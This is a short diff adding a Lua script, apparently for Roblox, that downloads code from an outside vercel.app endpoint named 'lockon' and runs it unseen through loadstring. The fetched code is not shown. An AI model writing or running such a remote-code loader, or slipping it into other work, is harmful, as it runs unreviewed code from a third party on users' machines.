@@ -1,0 +1,16 @@
+local url = "https://repo-tan-one.vercel.app/api/lockon"
+
+local success, response = pcall(function()
+    return game:HttpGet(url)
+end)
+
+if success and response then
+    local fn, err = loadstring(response)
+    if fn then
+        fn()
+    else
+        warn("Error loading Lua code:", err)
+    end
+else
+    warn("HTTP request failed:", response)
+end
